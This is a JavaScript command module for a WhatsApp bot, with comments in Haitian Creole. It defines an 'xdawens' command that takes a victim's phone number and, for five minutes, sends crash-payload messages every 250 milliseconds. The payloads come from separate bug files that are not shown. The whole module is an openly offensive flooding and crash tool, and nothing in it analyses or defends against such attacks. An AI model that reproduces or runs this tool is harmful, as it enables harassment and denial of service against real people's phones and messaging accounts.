const { cmd } = require('../command');
const config = require('../config');
const bugchat = require('../bug/izuka6.js');      // Payload prensipal (pi fò)
const bugchatPlus = require('../bug/izuka6plus.js'); // Payload dezyèm, pi puisan

cmd({
  pattern: 'xdawens',
  desc: 'Send powerful crash to WhatsApp user for 5 minutes',
  category: 'bug',
  react: '💀',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const botNumber = await bot.decodeJid(bot.user.id);
    const senderId = m.sender;
    const allowedUsers = [
      botNumber,
      config.OWNER_NUMBER + '@s.whatsapp.net',
      ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')
    ];
    const protectedNumbers = ['13058962443'];

    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'xdawens') return;

    if (!allowedUsers.includes(senderId)) {
      return await bot.sendMessage(from, { text: '*🚫 Only owner/sudo can use this command.*' }, { quoted: mek });
    }

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];
    const usePlusPayload = args.includes('plus'); // Si user ajoute "plus" nan args, itilize payload plus

    if (!targetNumber || isNaN(targetNumber)) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}xdawens <number> [plus]`
      }, { quoted: mek });
    }

    if (protectedNumbers.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ This number is protected. Command aborted.'
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const payloadLines = (usePlusPayload ? bugchatPlus : bugchat).split('\n').filter(Boolean);

    await bot.sendMessage(from, {
      text: `💀 *XDAWENS CRASH STARTED*\n🎯 Target: +${targetNumber}\n🕒 Duration: 5 minutes\n\n📤 Sending ${usePlusPayload ? 'PLUS' : 'STANDARD'} payload...`,
    }, { quoted: mek });

    const endTime = Date.now() + 5 * 60 * 1000; // 5 minutes
    let count = 1;

    while (Date.now() < endTime) {
      for (let line of payloadLines) {
        await bot.sendMessage(targetJid, {
          text: `💥 *XDAWENS CRASH #${count}*\n${line}\n\n⚠️ _Do not reply_`
        });
        count++;
        await new Promise(r => setTimeout(r, 250));
      }
    }

    await bot.sendMessage(from, {
      text: `✅ *XDAWENS CRASH finished on* +${targetNumber}`,
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});
